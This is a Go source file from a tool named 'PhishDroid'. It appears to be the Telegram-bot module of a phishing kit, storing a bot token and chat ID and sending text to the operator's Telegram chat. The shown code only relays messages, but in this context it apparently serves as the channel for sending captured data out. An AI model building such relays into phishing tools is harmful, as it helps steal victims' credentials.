package main

import (
	"encoding/json"
	"errors"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"strings"

	"github.com/raifpy/Go/raiFile"

	"github.com/raifpy/Go/errHandler"
)

type tgBot struct {
	use    bool
	hash   string
	chatID string
}

//NewtgBot PhishDroid v0.2
func NewtgBot(hash, chatID string) *tgBot {
	return &tgBot{use: true, hash: hash, chatID: chatID}
}
func (t tgBot) send(text string) {
	go http.Get("https://api.telegram.org/bot" + t.hash + "/sendMessage?chat_id=" + t.chatID + "&text=" + url.QueryEscape(text))
	//return err

}
func (t tgBot) sendReturn(text string) ([]byte, error) {
	response, err := http.Get("https://api.telegram.org/bot" + t.hash + "/sendMessage?chat_id=" + t.chatID + "&text=" + url.QueryEscape(text))
	if errHandler.HandlerBool(err) {
		return nil, err
	}
	ham, _ := ioutil.ReadAll(response.Body)
	return ham, nil

}
func (t tgBot) test() (bool, string) {
	var sonuc map[string]interface{}
	respByte, err := t.sendReturn("Hello From @Codeksiyon 's PhishDroid\nThis is test message; You can delete.")
	if errHandler.HandlerBool(err) {
		return false, err.Error()
	}
	err = json.Unmarshal(respByte, &sonuc)
	if errHandler.HandlerBool(err) {
		return false, err.Error()
	}
	ok, ok2 := sonuc["ok"].(bool)
	if !ok2 {
		return false, "API Error Level 1"
	}
	if !ok {
		return false, sonuc["description"].(string)
	}
	return true, ""

}

func checkTGBotAvaible() bool {
	_, err := os.Stat("./tgbot")
	if os.IsNotExist(err) {
		return false
	}
	return true
}

func getTGBot() (*tgBot, error) {
	value, err := ioutil.ReadFile("./tgbot")
	if errHandler.HandlerBool(err) {
		return nil, err
	}
	valueStr := string(value)
	valueList := strings.Split(valueStr, "\n")
	if len(valueList) < 2 { // hash \n chat_id
		return nil, errors.New("tgbot file error 1")
	}
	return &tgBot{use: true, hash: valueList[0], chatID: valueList[1]}, nil

}

func setTGBot(t tgBot) error {
	return raiFile.WriteFile("./tgbot", t.hash+"\n"+t.chatID)
}
